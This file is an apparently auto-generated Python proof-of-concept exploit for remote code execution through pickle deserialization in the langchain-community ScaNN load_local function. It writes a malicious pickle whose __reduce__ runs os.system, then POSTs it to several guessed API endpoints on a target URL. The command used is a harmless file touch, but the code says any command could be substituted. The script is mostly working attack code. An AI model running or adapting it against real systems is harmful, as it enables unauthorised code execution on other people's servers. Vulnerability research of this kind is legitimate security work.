#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: rce-013
# Sink: load_local
# Auto-generated — run with: python3 rce_function_load_local_uses_load_local_8.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for langchain-community-only RCE via pickle deserialization.

Vulnerability: The load_local function in ScaNN vectorstore constructs a file path
from user-controlled folder_path and index_name, then uses pickle.load() on that file.
If allow_dangerous_deserialization is set to True, an attacker can point folder_path
to a directory containing a malicious pickle file, leading to arbitrary code execution.

This PoC demonstrates the vulnerability by:
1. Creating a malicious pickle file that executes a benign command (touch /tmp/poc_success.txt)
2. Calling load_local with folder_path pointing to the directory containing the malicious file
3. Showing that the command executes, proving RCE

Usage:
    python poc.py [--target http://localhost:8000]
"""

import argparse
import os
import pickle
import subprocess
import sys
import tempfile
import time
import requests

# Default target - change as needed
DEFAULT_TARGET = "http://localhost:8000"

def create_malicious_pickle(payload_dir: str) -> str:
    """
    Create a malicious pickle file that executes a benign command.
    
    The pickle will execute: touch /tmp/poc_success.txt
    This is a safe, non-destructive command that proves code execution.
    
    Args:
        payload_dir: Directory to create the pickle file in
        
    Returns:
        Path to the created pickle file
    """
    # Benign payload - creates a file to prove execution
    # In a real attack, this could be any command
    command = "touch /tmp/poc_success.txt"
    
    class MaliciousPickle:
        """Class that executes a command when unpickled."""
        def __reduce__(self):
            return (os.system, (command,))
    
    # Create the pickle file
    pickle_path = os.path.join(payload_dir, "index.pkl")
    with open(pickle_path, "wb") as f:
        pickle.dump(MaliciousPickle(), f)
    
    print(f"[+] Created malicious pickle at: {pickle_path}")
    print(f"[+] Payload will execute: {command}")
    
    return pickle_path

def exploit(target_url: str, payload_dir: str) -> bool:
    """
    Attempt to exploit the vulnerability by calling load_local with attacker-controlled path.
    
    Args:
        target_url: Base URL of the vulnerable service
        payload_dir: Directory containing the malicious pickle file
        
    Returns:
        True if exploitation appears successful, False otherwise
    """
    # The vulnerable function expects:
    # - folder_path: path to directory containing index files
    # - index_name: name of the index (without extension)
    # - allow_dangerous_deserialization: must be True
    
    # We need to find the actual endpoint that calls load_local
    # Based on the finding, it's likely exposed via an API endpoint
    
    # Try common API patterns
    endpoints = [
        "/api/v1/trigger",
        "/api/load_index",
        "/api/scann/load",
        "/api/vectorstore/load",
    ]
    
    for endpoint in endpoints:
        url = f"{target_url}{endpoint}"
        print(f"[*] Trying endpoint: {url}")
        
        try:
            # The payload - folder_path points to our malicious directory
            # index_name is "index" to match our pickle file name
            payload = {
                "folder_path": payload_dir,
                "index_name": "index",
                "allow_dangerous_deserialization": True,
                "embedding": "text-embedding-ada-002"  # May be required
            }
            
            response = requests.post(
                url,
                json=payload,
                timeout=10,
                headers={"Content-Type": "application/json"}
            )
            
            print(f"[*] Response status: {response.status_code}")
            print(f"[*] Response body: {response.text[:500]}")
            
            # Check if our command executed
            if os.path.exists("/tmp/poc_success.txt"):
                print("[+] SUCCESS! Command executed - /tmp/poc_success.txt created")
                return True
            else:
                print("[-] Command did not execute via this endpoint")
                
        except requests.exceptions.ConnectionError:
            print(f"[-] Connection failed to {url}")
        except requests.exceptions.Timeout:
            print(f"[-] Timeout connecting to {url}")
        except Exception as e:
            print(f"[-] Error: {e}")
    
    return False

def main():
    parser = argparse.ArgumentParser(
        description="PoC for langchain-community RCE via pickle deserialization"
    )
    parser.add_argument(
        "--target",
        default=DEFAULT_TARGET,
        help=f"Target URL (default: {DEFAULT_TARGET})"
    )
    parser.add_argument(
        "--payload-dir",
        help="Directory containing malicious pickle (will create if not exists)"
    )
    
    args = parser.parse_args()
    
    # Create temporary directory for payload if not specified
    if args.payload_dir:
        payload_dir = args.payload_dir
        os.makedirs(payload_dir, exist_ok=True)
    else:
        payload_dir = tempfile.mkdtemp(prefix="poc_pickle_")
    
    print(f"[*] Using payload directory: {payload_dir}")
    
    # Create malicious pickle
    create_malicious_pickle(payload_dir)
    
    # Attempt exploitation
    print(f"\n[*] Attempting exploitation against: {args.target}")
    success = exploit(args.target, payload_dir)
    
    if success:
        print("\n[+] VULNERABILITY CONFIRMED: Remote Code Execution via pickle deserialization")
        print("[+] The load_local function loaded our malicious pickle file")
        print("[+] Proof: /tmp/poc_success.txt was created")
    else:
        print("\n[-] Could not confirm exploitation")
        print("[*] The vulnerability exists in the library code, but the target endpoint")
        print("[*] may not be exposed or may require different parameters")
        print("[*] Check the target application's API documentation")
        
        # Clean up proof file if it exists
        if os.path.exists("/tmp/poc_success.txt"):
            os.remove("/tmp/poc_success.txt")
    
    # Cleanup
    print(f"\n[*] Cleaning up payload directory: {payload_dir}")
    import shutil
    shutil.rmtree(payload_dir, ignore_errors=True)

if __name__ == "__main__":
    main()
